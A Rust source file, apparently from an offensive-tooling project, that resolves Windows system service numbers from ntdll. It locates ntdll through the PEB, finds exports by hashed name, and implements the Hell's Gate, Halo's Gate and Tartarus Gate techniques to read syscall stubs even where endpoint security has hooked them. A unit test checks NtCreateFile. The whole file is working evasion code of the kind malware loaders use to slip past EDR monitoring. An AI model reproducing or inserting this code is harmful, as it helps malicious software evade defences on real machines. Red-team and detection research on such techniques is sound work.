use std::mem::transmute;

use ntapi::ntheader::ImageExportDirectory;
use shared::{
    ntpeb::{get_nt_headers, ldr_module_base_addr, NTDLL_HASH},
    utils::{dbj2_hash, get_cstr_len},
};

pub unsafe fn get_ssn(function_hash: u32) -> Option<u16> {
    let ntdll_base = ldr_module_base_addr(NTDLL_HASH);
    let p_img_nt_headers = get_nt_headers(ntdll_base);

    if p_img_nt_headers.is_null() {
        return None;
    }

    let data_directory = &(*p_img_nt_headers).optional_header.data_directory[0];
    let export_directory =
        (ntdll_base.offset(data_directory.virtual_address as isize)) as *mut ImageExportDirectory;
    if export_directory.is_null() {
        return None;
    }

    let number_of_functions = (*export_directory).number_of_functions;
    let array_of_names =
        ntdll_base.offset((*export_directory).address_of_names as isize) as *const u32;
    let array_of_addresses =
        ntdll_base.offset((*export_directory).address_of_functions as isize) as *const u32;
    let array_of_ordinals =
        ntdll_base.offset((*export_directory).address_of_name_ordinals as isize) as *const u16;

    let names = core::slice::from_raw_parts(array_of_names, number_of_functions as _);
    let functions = core::slice::from_raw_parts(array_of_addresses, number_of_functions as _);
    let ordinals = core::slice::from_raw_parts(array_of_ordinals, number_of_functions as _);

    for i in 0..number_of_functions {
        let name_addr = ntdll_base.offset(names[i as usize] as isize) as *const i8;
        let name_len = get_cstr_len(name_addr as _);
        let name_slice: &[u8] = core::slice::from_raw_parts(name_addr as _, name_len);

        if function_hash as u32 == dbj2_hash(name_slice) {
            let ordinal = ordinals[i as usize] as usize;
            let function_address = ntdll_base.offset(functions[ordinal] as isize);

            // Hells Gate
            // MOV R10, RCX
            // MOV EAX, <syscall>
            let hells_gate_pattern: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8];
            let func_data = *transmute::<*const u8, *const [u8; 6]>(function_address);
            if func_data[0..4] == hells_gate_pattern {
                let high = func_data[5] as u16;
                let low = func_data[4] as u16;
                let ssn = (high << 8) | low;
                return Some(ssn);
            }

            // Halos Gate
            // JMP <relative>
            // ...
            if func_data[0] == 0xE9 {
                const UP: isize = -32;
                const DOWN: isize = 32;
                for idx in 1..255 {
                    let current_up_func_address = function_address.offset(idx * UP);
                    let current_up_func_data =
                        *transmute::<*const u8, *const [u8; 6]>(current_up_func_address);
                    if current_up_func_data[0..4] == hells_gate_pattern {
                        let high = current_up_func_data[5] as u16;
                        let low = current_up_func_data[4] as u16;
                        let ssn = (high << 8) | (low + idx as u16);
                        return Some(ssn);
                    }
                    let current_down_func_address = function_address.offset(idx * DOWN);
                    let current_down_func_data =
                        *transmute::<*const u8, *const [u8; 6]>(current_down_func_address);
                    if current_down_func_data[0..4] == hells_gate_pattern {
                        let high = current_down_func_data[5] as u16;
                        let low = current_down_func_data[4] as u16;
                        let ssn = (high << 8) | (low - idx as u16);
                        return Some(ssn);
                    }
                }
            }

            // Tartarus Gate
            // JMP in position 3
            // ...
            if func_data[3] == 0xE9 {
                const UP: isize = -32;
                const DOWN: isize = 32;
                for idx in 1..255 {
                    let current_up_func_address = function_address.offset(idx * UP);
                    let current_up_func_data =
                        *transmute::<*const u8, *const [u8; 6]>(current_up_func_address);
                    if current_up_func_data[0..4] == hells_gate_pattern {
                        let high = current_up_func_data[5] as u16;
                        let low = current_up_func_data[4] as u16;
                        let ssn = (high << 8) | (low + idx as u16);
                        return Some(ssn);
                    }
                    let current_down_func_address = function_address.offset(idx * DOWN);
                    let current_down_func_data =
                        *transmute::<*const u8, *const [u8; 6]>(current_down_func_address);
                    if current_down_func_data[0..4] == hells_gate_pattern {
                        let high = current_down_func_data[5] as u16;
                        let low = current_down_func_data[4] as u16;
                        let ssn = (high << 8) | (low - idx as u16);
                        return Some(ssn);
                    }
                }
            }
        }
    }
    None
}

#[test]
fn test_get_ssn() {
    let ssn = unsafe { get_ssn(dbj2_hash(b"NtCreateFile")) };
    assert!(ssn.is_some());
    // println!("NtCreateFile SSN: {:?}", ssn);
}
